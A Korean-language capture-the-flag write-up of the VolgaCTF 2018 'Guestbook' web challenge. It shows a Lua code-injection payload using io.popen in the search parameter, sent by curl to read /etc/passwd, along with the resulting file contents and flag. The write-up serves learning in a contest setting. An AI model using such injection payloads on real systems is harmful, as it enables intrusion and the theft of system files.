# [Web] VolgaCTF - Guestbook

## Description

Drop a line to us <http://guestbook.quals.2018.volgactf.ru/>



## Analysis

페이지는 단순하게 되어 있다.

기능은 크게 2가지 글 작성, 글 검색이다.

아무리봐도 글 작성 부분에서는 취약점이 발생할 것 같지 않았다.

그래서 글 검색 부분을 중점으로 삽질을 하였다.

\x251을 검색하였더니 `%search%`의 결과가 나오는 걸로봐서 스트링 포맷이나 그런거 같아보였다.

삽질하다가 Lua 스크립크로 구현되 있는것을 발견하였다.



## Exploit

Lua 문법으로 /etc/passwd파일을 열었고, flag를 얻었다.

**Query :** "..io.popen('cat$IFS/etc/passwd','r'):read('a').."

```
$ curl "http://guestbook.quals.2018.volgactf.ru/search?search=\"..io.popen('cat\$IFS/etc/passwd','r'):read('a')..\"" 

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VolgaCTF Guestbook</title>

...
<div class="container">
  <form action="/search" method="get">
    <div class="form-group">
    	<label for="hText">Text</label>
      <input type="text" class="form-control" id="hText" placeholder="Text (required)" name="search" value="root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:mailing list manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:gnats bug-reporting system (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd time synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd network management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd bus proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:115:mysql server,,,:/nonexistent:/bin/false
volgactf:x:1000:1000:volgactf{edfda74ff3b0e2fe43f2be18cc6af1f2}:/home/volgactf:/sbin/nologin
" required>
    </div>
    <button type="submit" class="btn btn-primary">Search</button>
  </form>
</div>
...
```



**volgactf{edfda74ff3b0e2fe43f2be18cc6af1f2}**